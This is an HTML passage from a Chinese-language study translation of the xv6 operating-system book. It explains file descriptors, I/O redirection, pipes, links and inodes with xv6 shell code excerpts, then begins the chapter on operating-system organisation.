<ul>
<li>新分配的文件描述符总是当前进程中最小的未使用描述符。</li>
</ul>
</li>
<li><p>文件描述符和 <strong>fork</strong> 相互作用，使 I&#x2F;O 重定向易于实现。</p>
<ul>
<li><strong>fork</strong> 将父进程的文件描述符表和它的内存一起复制，这样子进程开始时打开的文件和父进程完全一样。</li>
<li>系统调用 <strong>exec</strong> 替换调用进程的内存，但会保留文件描述符表。</li>
<li>这种行为允许 shell 通过 <strong>fork</strong> 实现 I&#x2F;O 重定向，在子进程中重新打开所选的文件描述符，然后调用 <strong>exec</strong> 运行新程序。</li>
<li>下面是 shell 运行 <strong>cat &lt; input.txt</strong> 命令的简化版代码。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    close(<span class="number">0</span>); </span><br><span class="line">    open(<span class="string">&quot;input.txt&quot;</span>, O_RDONLY);  </span><br><span class="line">    exec(<span class="string">&quot;cat&quot;</span>, argv);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在子进程关闭文件描述符 0 后，<strong>open</strong> 保证对新打开的 <strong>input.txt</strong> 使用该文件描述符0。因为此时0将是最小的可用文件描述符。</p>
<ul>
<li>然后 <strong>cat</strong> 执行时，文件描述符 0（标准输入）会指向 <strong>input.txt</strong>。</li>
<li>这不会改变父进程的文件描述符，它只会修改子进程的描述符。</li>
</ul>
</li>
<li><p>xv6 shell 中的 I&#x2F;O 重定向代码正是以这种方式工作的（user&#x2F;sh.c:82）。</p>
<ul>
<li>回想一下 shell 的代码，shell 已经 <strong>fork</strong> 子shell，<strong>runcmd</strong> 将调用 <strong>exec</strong> 来加载新的程序。</li>
</ul>
</li>
</ul>
<blockquote>
<p>user&#x2F;sh.c:82</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> REDIR:</span><br><span class="line">    rcmd = (<span class="keyword">struct</span> redircmd*)cmd;</span><br><span class="line">    close(rcmd-&gt;fd);</span><br><span class="line">    <span class="keyword">if</span>(open(rcmd-&gt;file, rcmd-&gt;mode) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;open %s failed\n&quot;</span>, rcmd-&gt;file);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    runcmd(rcmd-&gt;cmd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p><strong>open</strong> 的第二个参数由一组用位表示的标志组成，用来控制 <strong>open</strong> 的工作。</p>
<ul>
<li>可能的值在文件控制 (fcntl) 头 (kernel&#x2F;fcntl.h:1-5) 中定义。</li>
<li><strong>O_RDONLY,</strong> <strong>O_WRONLY,</strong> <strong>O_RDWR</strong>, <strong>O_CREATE</strong>, 和 <strong>O_TRUNC,</strong> 它们分别指定 open 打开文件时的功能，读、写、读和写、如果文件不存在则创建文件、将文件长度截断为 0。</li>
</ul>
</li>
<li><p>现在应该清楚为什么 <strong>fork</strong> 和 <strong>exec</strong> 是分开调用的：在这两个调用之间，shell 有机会重定向子进程的 I&#x2F;O，而不干扰父进程的 I&#x2F;O 设置。</p>
<ul>
<li>我们可以假设一个由 <strong>fork</strong> 和 <strong>exec</strong> 组成的系统调用 <strong>forkexec</strong>，但是用这种调用来做 I&#x2F;O 重定向似乎很笨拙。</li>
<li>shell 在调用 <strong>forkexec</strong> 之前修改自己的 I&#x2F;O 设置（然后取消这些修改），或者 <strong>forkexec</strong> 可以将 I&#x2F;O 重定向的指令作为参数，或者（最糟糕的方案）每个程序（比如 cat）都需要自己做 I&#x2F;O 重定向。</li>
</ul>
</li>
<li><p>虽然 <strong>fork</strong> 复制了文件描述符表，但每个底层文件的偏移量都是父子共享的。想一想下面的代码。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     write(<span class="number">1</span>, <span class="string">&quot;hello &quot;</span>, <span class="number">6</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;world\n&quot;</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>在这个片段的最后，文件描述符 1 所引用的文件将包含数据 hello world。父进程中的 <strong>write</strong>（由于有了 <strong>wait</strong>，只有在子进程结束后才会运行）会从子进程的 <strong>write</strong> 结束的地方开始。</p>
<ul>
<li>这种行为有助于从 shell 命令的序列中产生有序的输出，比如 <strong>(echo hello; echo world) &gt;output.txt</strong>。</li>
</ul>
</li>
<li><p><strong>dup</strong> 系统调用复制一个现有的文件描述符，返回一个新的描述符，它指向同一个底层 I&#x2F;O 对象。</p>
<ul>
<li>两个文件描述符共享一个偏移量，就像被 <strong>fork</strong> 复制的文件描述符一样。这是将 hello world 写进文件的另一种方法。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = dup(<span class="number">1</span>);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;hello &quot;</span>, <span class="number">6</span>);</span><br><span class="line">write(fd, <span class="string">&quot;world\n&quot;</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果两个文件描述符是通过一系列的 <strong>fork</strong> 和 <strong>dup</strong> 调用从同一个原始文件描述符衍生出来的，那么这两个文件描述符共享一个偏移量。</p>
<ul>
<li>否则，文件描述符不共享偏移量，即使它们是由同一个文件的打开调用产生的。</li>
<li><strong>dup</strong> 允许 shell 实现这样的命令：l<strong>s existing-file non-existing-file &gt; tmp1 2&gt;&amp;1</strong>。</li>
<li>2&gt;&amp;1 表示 2 是 1 的复制（**dup(1)**），即重定向错误信息到标准输出，已存在文件的名称和不存在文件的错误信息都会显示在文件tmp1中。</li>
<li>xv6 shell 不支持错误文件描述符的 I&#x2F;O 重定向，但现在你知道如何实现它了。</li>
</ul>
</li>
<li><p>文件描述符是一个强大的抽象，因为它们隐藏了它们连接的细节：一个向文件描述符 1 写入的进程可能是在向一个文件、控制台等设备或向一个管道写入。</p>
</li>
</ul>
<h2 id="Pipes-管道"><a href="#Pipes-管道" class="headerlink" title="Pipes 管道"></a>Pipes 管道</h2><ul>
<li><p><strong>管道</strong> 是一个小的内核缓冲区，作为一对文件描述符提供给进程，一个用于读，一个用于写。</p>
<ul>
<li>将数据写入管道的一端就可以从管道的另一端读取数据。</li>
<li>管道为进程提供了一种通信方式。</li>
</ul>
</li>
<li><p>下面的示例代码运行程序 wc，标准输入连接到管道的读取端。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">pipe(p);</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    close(<span class="number">0</span>); </span><br><span class="line">    dup(p[<span class="number">0</span>]); </span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">    exec(<span class="string">&quot;/bin/wc&quot;</span>, argv); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    write(p[<span class="number">1</span>], <span class="string">&quot;hello world\n&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>程序调用 <strong>pipe</strong>，创建一个新的管道，并将读写文件描述符记录在数组 <strong>p</strong> 中，经过 <strong>fork</strong> 后，父进程和子进程的文件描述符都指向管道。</p>
<ul>
<li>子进程调用 <strong>close</strong> 和 <strong>dup</strong> 使文件描述符 0 引用管道的读端，并关闭 p 中的文件描述符，并调用 <strong>exec</strong> 运行 <strong>wc</strong>。</li>
<li>当 <strong>wc</strong> 从其标准输入端读取时，它将从管道中读取。</li>
<li>父进程关闭管道的读端，向管道写入，然后关闭写端。</li>
</ul>
</li>
<li><p>如果没有数据可用，管道上的 <strong>read</strong> 会等待数据被写入，或者等待所有指向写端的文件描述符被关闭；在后一种情况下，读将返回 0，就像数据文件的结束一样。</p>
</li>
<li><p>事实上，如果没有数据写入，读会无限阻塞，直到新数据不可能到达为止（写端被关闭），这也是子进程在执行上面的 <strong>wc</strong> 之前关闭管道的写端很重要的一个原因：如果 wc 的一个文件描述符仍然引用了管道的写端，那么 <strong>wc</strong> 将永远看不到文件的关闭（被自己阻塞）。</p>
</li>
<li><p>xv6 的 shell 实现了管道，如 <strong>grep fork sh.c | wc -l</strong>，shell 的实现类似于上面的代码（user&#x2F;sh.c:100）。</p>
<ul>
<li>执行 shell 的子进程创建一个管道来连接管道的左端和右端（去看源码，不看难懂）。然后，它在管道左端（写入端）调用 <strong>fork</strong> 和 <strong>runcmd</strong>，在右端（读取端）调用 <strong>fork</strong> 和 <strong>runcmd</strong>，并等待两者结束。</li>
<li>管道的右端（读取端）可以是一个命令，也可以是包含管道的多个命令（例如，<strong>a | b | c</strong>），它又会分叉为两个新的子进程（一个是<strong>b</strong>，一个是<strong>c</strong>）。</li>
<li>因此，shell 可以创建一棵进程树。这棵树的叶子是命令，内部（非叶子）节点是等待左右子进程结束的进程。</li>
</ul>
</li>
</ul>
<blockquote>
<p>user&#x2F;sh.c:100</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PIPE:</span><br><span class="line">    pcmd = (<span class="keyword">struct</span> pipecmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(pipe(p) &lt; <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fork1() == <span class="number">0</span>)&#123;</span><br><span class="line">      close(<span class="number">1</span>);</span><br><span class="line">      dup(p[<span class="number">1</span>]);</span><br><span class="line">      close(p[<span class="number">0</span>]);</span><br><span class="line">      close(p[<span class="number">1</span>]);</span><br><span class="line">      runcmd(pcmd-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fork1() == <span class="number">0</span>)&#123;</span><br><span class="line">      close(<span class="number">0</span>);</span><br><span class="line">      dup(p[<span class="number">0</span>]);</span><br><span class="line">      close(p[<span class="number">0</span>]);</span><br><span class="line">      close(p[<span class="number">1</span>]);</span><br><span class="line">      runcmd(pcmd-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>原则上，我们可以让内部节点（非叶节点）运行管道的左端，但这样的实现会更加复杂。</p>
<ul>
<li>考虑只做以下修改：修改sh.c，使其不为 <strong>runcmd(p-&gt;left)</strong> fork 进程，直接递归运行 **runcmd(p-&gt;left)**。</li>
<li>像这样，<strong>echo hi | wc</strong> 不会产生输出，因为当 <strong>echo hi</strong> 在 <strong>runcmd</strong> 中退出时，内部进程会退出，而不会调用 <strong>fork</strong> 来运行管道的右端。</li>
<li>这种不正确的行为可以通过不在 <strong>runcmd</strong> 中为内部进程调用 <strong>exit</strong> 来修正，但是这种修正会使代码变得复杂：<strong>runcmd</strong> 需要知道该进程是否是内部进程（非叶节点）。</li>
<li>当不为 <strong>runcmd(p-&gt;right)</strong> fork 进程时，也会出现复杂的情况。像这样的修改，<strong>sleep 10 | echo hi</strong> 就会立即打印出 hi，而不是10 秒后，因为 <strong>echo</strong> 会立即运行并退出，而不是等待 <strong>sleep</strong> 结束。</li>
<li>由于 sh.c 的目标是尽可能的简单，所以它并没有试图避免创建内部进程。</li>
</ul>
</li>
<li><p>管道似乎没有比临时文件拥有更多的功能：</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hello world | wc</span><br></pre></td></tr></table></figure>

<ul>
<li>不使用管道：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hello world &gt;/tmp/xyz; wc &lt;/tmp/xyz</span><br></pre></td></tr></table></figure>

<ul>
<li>在这种情况下，管道比临时文件至少有四个优势。<ul>
<li>首先，管道会自动清理自己；如果是文件重定向，shell 在完成后必须小心地删除 &#x2F;tmp&#x2F;xyz。</li>
<li>第二，管道可以传递任意长的数据流，而文件重定向则需要磁盘上有足够的空闲空间来存储所有数据。</li>
<li>第三，管道可以分阶段的并行执行，而文件方式则需要在第二个程序开始之前完成第一个程序。</li>
<li>第四，如果你要实现进程间的通信，管道阻塞读写比文件的非阻塞语义更有效率。</li>
</ul>
</li>
</ul>
<h2 id="File-system-文件系统"><a href="#File-system-文件系统" class="headerlink" title="File system 文件系统"></a>File system 文件系统</h2><ul>
<li>xv6 文件系统包含了数据文件（拥有字节数组）和目录（拥有对数据文件和其他目录的命名引用）。<ul>
<li>这些目录形成一棵树，从一个被称为根目录的特殊目录开始。</li>
<li>像 <strong>&#x2F;a&#x2F;b&#x2F;c</strong> 这样的路径指的是根目录 <strong>&#x2F;</strong> 中的 <strong>a</strong> 目录中的 <strong>b</strong> 目录中的名为 <strong>c</strong> 的文件或目录。</li>
<li>不以 <strong>&#x2F;</strong> 开头的路径是相对于调用进程的当前目录进行计算其绝对位置的，可以通过 <strong>chdir</strong> 系统调用来改变进程的当前目录。</li>
<li>下面两个 <strong>open</strong> 打开了同一个文件（假设所有涉及的目录都存在）。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">&quot;/a&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">open(<span class="string">&quot;c&quot;</span>, O_RDONLY);</span><br><span class="line">open(<span class="string">&quot;/a/b/c&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>前两行将进程的当前目录改为 <strong>&#x2F;a&#x2F;b</strong>；后面两行既不引用也不改变进程的当前目录。</p>
</li>
<li><p>有一些系统调用来可以创建新的文件和目录：<strong>mkdir</strong> 创建一个新的目录，用 <strong>open</strong> 加上 <strong>O_CREATE</strong> 标志创建并打开一个新的数据文件，以及 <strong>mknod</strong> 创建一个新的设备文件。这个例子说明了这三个系统调用的使用。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;/dir&quot;</span>);</span><br><span class="line">fd = open(<span class="string">&quot;/dir/file&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line">mknod(<span class="string">&quot;/console&quot;</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>mknod</strong> 创建了一个引用设备的特殊文件。与</p>
<ul>
<li>设备文件相关联的是主要设备号和次要设备号 ( <strong>mknod</strong> 的两个参数)，它们唯一地标识一个内核设备。</li>
<li>当一个进程打开设备文件后，内核会将系统的读写调用转移到内核设备实现上，而不是将它们传递给文件系统。</li>
</ul>
</li>
<li><p>文件名称与文件是不同的；底层文件（非磁盘上的文件）被称为 <strong>inode</strong>，一个 inode 可以有多个名称，称为 <strong>链接</strong>。</p>
<ul>
<li>每个链接由目录中的一个项组成；该项包含一个文件名和对 inode 的引用。</li>
<li>inode 保存着一个文件的 <strong>metadata</strong>（元数据），包括它的类型（文件或目录或设备），它的长度，文件内容在磁盘上的位置，以及文件的链接数量。</li>
</ul>
</li>
<li><p><strong>fstat</strong> 系统调用从文件描述符引用的 inode 中检索信息。它定义在 <strong>stat.h</strong>  (kernel&#x2F;stat.h) 的 <strong>stat</strong> 结构中：</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> T_DIR 1    	<span class="comment">// Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_FILE 2   	<span class="comment">// File</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_DEVICE 3 	<span class="comment">// Device</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> dev;     	<span class="comment">// File system’s disk device</span></span><br><span class="line">    uint ino;    	<span class="comment">// Inode number</span></span><br><span class="line">    <span class="type">short</span> type;  	<span class="comment">// Type of file</span></span><br><span class="line">    <span class="type">short</span> nlink; 	<span class="comment">// Number of links to file</span></span><br><span class="line">    uint64 size; 	<span class="comment">// Size of file in bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>link</strong> 系统调用创建了一个引用了同一个 inode 的文件（文件名）。下面的片段创建了引用了同一个 inode 两个文件 a 和 b。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&quot;a&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">link(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>读写 a 与读写 b 是一样的，每个 inode 都有一个唯一的 inode 号来标识。</p>
<ul>
<li>经过上面的代码序列后，可以通过检查 fstat 的结果来确定 a 和 b 指的是同一个底层内容：两者将返回相同的 inode 号（<strong>ino</strong>），并且 nlink 计数为 2。</li>
</ul>
</li>
<li><p><strong>unlink</strong> 系统调用会从文件系统中删除一个文件名。</p>
<ul>
<li>只有当文件的链接数为零且没有文件描述符引用它时，文件的 inode 和存放其内容的磁盘空间才会被释放。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(<span class="string">&quot;a&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>上面这行代码会删除 a，此时只有 b 会引用 inode。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/tmp/xyz&quot;</span>, O_CREATE | O_RDWR);</span><br><span class="line">unlink(<span class="string">&quot;/tmp/xyz&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>这段代码是创建一个临时文件的一种惯用方式，它创建了一个无名称 inode，故会在进程关闭 <strong>fd</strong> 或者退出时删除文件。</p>
</li>
<li><p>Unix 提供了 shell 可调用的文件操作程序，作为用户级程序，例如 <strong>mkdir</strong>、<strong>ln</strong> 和 <strong>rm</strong>。</p>
<ul>
<li>这种设计允许任何人通过添加新的用户级程序来扩展命令行接口。</li>
<li>现在看来，这个设计似乎是显而易见的，但在 Unix 时期设计的其他系统通常将这类命令内置到 shell 中（并将 shell 内置到内核中）。</li>
</ul>
</li>
<li><p>有一个例外，那就是 cd，它是在 shell 中实现的 (user&#x2F;sh.c:160)。cd 必须改变 shell 自身的当前工作目录。</p>
<ul>
<li>如果 cd 作为一个普通命令执行，那么 shell 就会 fork 一个子进程，而子进程会运行 cd，cd 只会改变子进程的当前工作目录。父进程（即 shell）的工作目录则保持不变。</li>
</ul>
</li>
</ul>
<blockquote>
<p>user&#x2F;sh.c:160</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read and run input commands.</span></span><br><span class="line">  <span class="keyword">while</span>(getcmd(buf, <span class="keyword">sizeof</span>(buf)) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; buf[<span class="number">2</span>] == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">      <span class="comment">// Chdir must be called by the parent, not the child.</span></span><br><span class="line">      buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="number">0</span>;  <span class="comment">// chop \n</span></span><br><span class="line">      <span class="keyword">if</span>(chdir(buf+<span class="number">3</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;cannot cd %s\n&quot;</span>, buf+<span class="number">3</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fork1() == <span class="number">0</span>)</span><br><span class="line">      runcmd(parsecmd(buf));</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="Real-world-现实情况"><a href="#Real-world-现实情况" class="headerlink" title="Real world 现实情况"></a>Real world 现实情况</h2><ul>
<li><p>Unix 将标准文件描述符、管道和方便的 shell 语法结合起来进行操作，是编写通用可重用程序的一大进步。</p>
<ul>
<li>这个想法引发了一种 “软件工具” 文化，这也是 Unix 强大和流行的主要原因，而 shell 是第一种所谓的脚本语言。</li>
<li>Unix 系统调用接口今天仍然存在于 BSD、Linux 和 Mac OS X 等操作系统中。</li>
</ul>
</li>
<li><p>xv6 并不符合 POSIX 标准：它缺少许多系统调用（包括基本的系统调用，如 <strong>lseek</strong>），而且它提供的许多系统调用与标准不同。</p>
<ul>
<li>我们对 xv6 的主要目标是简单明了，同时提供一个简单的类似 UNIX 的系统调用接口。</li>
<li>一些人已经添加了一些系统调用和一个简单的 C 库扩展了 xv6，以便运行基本的 Unix 程序。</li>
<li>然而，现代内核比 xv6 提供了更多的系统调用和更多种类的内核服务。例如，它们支持网络、窗口系统、用户级线程、许多设备的驱动程序等等。</li>
<li>现代内核不断快速发展，并提供了许多超越 POSIX 的功能。</li>
</ul>
</li>
<li><p>Unix 用一套文件名和文件描述符接口统一了对多种类型资源（文件、目录和设备）的访问。</p>
<ul>
<li>这个思想可以扩展到更多种类的资源，一个很好的例子是 Plan 9 项目 [13]，它把资源就是文件的概念应用到网络、图形等方面。然而，大多数 Unix 衍生的操作系统都没有遵循这一路线。</li>
</ul>
</li>
<li><p>文件系统和文件描述符已经是强大的抽象。即便如此，操作系统接口还有其他模式。</p>
<ul>
<li>Multics 是 Unix 的前身，它以一种使文件存储看起来像内存的方式抽象了文件存储，产生了一种截然不同的接口。</li>
<li>Multics 设计的复杂性直接影响了 Unix 的设计者，他们试图建立一些更简单的东西。</li>
</ul>
</li>
<li><p>xv6 没有用户系统；用 Unix 的术语来说，所有的 xv6 进程都以 root 身份运行。</p>
</li>
<li><p>本书研究的是 xv6 如何实现其类似 Unix 的接口，但其思想和概念不仅仅适用于 Unix。</p>
<ul>
<li>任何操作系统都必须将进程复用到底层硬件上，将进程相互隔离，并提供受控进程间通信的机制。</li>
<li>在学习了 xv6 之后，您应该能够研究其他更复杂的操作系统，并在这些系统中看到 xv6 中蕴含的基本概念。</li>
</ul>
</li>
</ul>
<h2 id="Exercises-练习"><a href="#Exercises-练习" class="headerlink" title="Exercises 练习"></a>Exercises 练习</h2><ol>
<li>使用 UNIX 的系统调用编写一个程序，通过一对管道在两个进程之间交换一个字节，每个方向各一个。以交换次数&#x2F;秒为单位测量程序的性能。</li>
</ol>
<hr>
<ol>
<li><a name="ftn1"></a> 本文一般用 CPU 中央处理单元的缩写来指代执行计算的硬件单元。其他文本 (如 RISC-V 规范) 也使用processor、core 和 hart 等词代替 CPU。</li>
</ol>
<h1 id="Operating-system-organization-操作系统组织"><a href="#Operating-system-organization-操作系统组织" class="headerlink" title="Operating system organization 操作系统组织"></a>Operating system organization 操作系统组织</h1><ul>
<li><p>操作系统的一个关键要求是同时支持几个活动。</p>
<ul>
<li>例如，使用第 1 章中描述的系统调用接口，一个进程可以用 <strong>fork</strong> 创建新进程。</li>
<li>操作系统必须在这些进程之间分时共享计算机的资源。例如，即使进程的数量多于硬件CPU的数量，操作系统也必须保证所有的进程都有机会执行。</li>
<li>操作系统还必须安排进程之间的隔离。也就是说，如果一个进程出现了 bug 并发生了故障，其不应该影响不依赖该 bug 进程的进程。</li>
<li>然而，完全隔离也不可取，因为进程间可能需要进行交互，例如管道。</li>
<li>因此，一个操作系统必须满足三个要求：多路复用、隔离和交互。</li>
</ul>
</li>
<li><p>本章概述了如何组织操作系统来实现这三个要求。</p>
<ul>
<li>现实中有很多方法，但本文主要介绍以宏内核 <a href="#ftn1">[1]</a> 为中心的主流设计，很多 Unix 操作系统都采用这种设计。</li>
<li>本章还介绍了 xv6 进程的概述，xv6 进程是 xv6 中的隔离单元，还介绍了 xv6 启动时第一个进程的创建。</li>
</ul>
</li>
<li><p>xv6 运行在多核 <a href="#ftn2">[2]</a> RISC-V 微处理器上，它的许多底层功能（例如，它的进程实现）是 RISC-V 所特有的。</p>
<ul>
<li>RISC-V 是一个 64 位的 CPU，xv6 是用 “LP64” C 语言编写的，这意味着 C 编程语言中的 long(L) 和指针 (P) 是 64 位的，但 int 是 32 位的。</li>
<li>本书假定读者在某种架构上做过一点机器级的编程，并会介绍一些 RISC-V 特有的思想。</li>
<li>RISC-V 有用的参考资料是 “The RISC-V Reader,An Open Architecture Attlas”［12］。</li>
<li>用户级 ISA [2] 和特权架构 [1] 是官方规范。</li>
</ul>
</li>
<li><p>一台完整的计算机中的 CPU 被支持它的硬件所包围，这些硬件大部分呈 I&#x2F;O 接口的形式。</p>
<ul>
<li>编写 xv6 时，支撑它的硬件是通过带 “-machine virt” 选项的 qemu 模拟出来的。</li>
<li>其中包括 RAM、包含启动代码的 ROM、与用户键盘&#x2F;屏幕的串行连接以及用于存储的磁盘。</li>
</ul>
</li>
</ul>
<h2 id="Abstracting-physical-resources-抽象化物理资源"><a href="#Abstracting-physical-resources-抽象化物理资源" class="headerlink" title="Abstracting physical resources 抽象化物理资源"></a>Abstracting physical resources 抽象化物理资源</h2><ul>
<li><p>遇到一个操作系统，人们可能会问的第一个问题是为什么需要它呢？</p>
<ul>
